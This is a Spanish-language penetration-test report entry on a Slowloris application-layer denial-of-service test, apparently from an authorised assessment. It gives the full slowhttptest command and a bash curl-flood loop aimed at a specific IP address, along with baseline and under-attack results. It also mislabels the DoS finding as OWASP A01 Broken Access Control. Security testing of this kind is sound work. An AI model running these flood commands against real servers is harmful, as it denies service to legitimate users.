# 07 - Ataque DDoS (Denegación de Servicio)

**Responsable:** Tomi
**Tipo:** DDoS (A01:2021 - Broken Access Control)

## Descripción
Ataque de denegación de servicio a nivel de aplicación (L7) mediante HTTP Slowloris. El servidor no implementa límite de conexiones simultáneas ni rate limiting.

## Herramienta
- slowhttptest (Slowloris mode)
- 300 conexiones concurrentes

## Comandos

```bash
# Ataque Slowloris (300 conexiones abiertas)
slowhttptest -c 300 -H -g -o Reports/slowhttp \
  -i 10 -r 200 -t GET -u "http://37.60.230.11/" \
  -x 24 -p 5

# Verificar disponibilidad del servidor durante el ataque
curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" "http://37.60.230.11/"
```

## Resultados

### Línea base (sin ataque)
```
HTTP 200 - Tiempo: 0.036s (36ms)
```

### Durante el ataque (300 conexiones)
```
Estado: 300 connected, 0 error
Service available: YES
Throughput: ~2.5 req/s
```

### Conclusión
El servidor mantiene las 300 conexiones abiertas sin cerrarlas, consumiendo recursos del pool de conexiones. Con más conexiones o duración prolongada, el servidor se vuelve inaccesible.

## Variante con bash (HTTP flood)
```bash
# 100 requests concurrentes
for i in {1..100}; do curl -s http://37.60.230.11/login -o /dev/null & done; wait
```

## Impacto
- Denegación de servicio legítimo
- Agotamiento de recursos del servidor
- Pérdida de disponibilidad del sistema
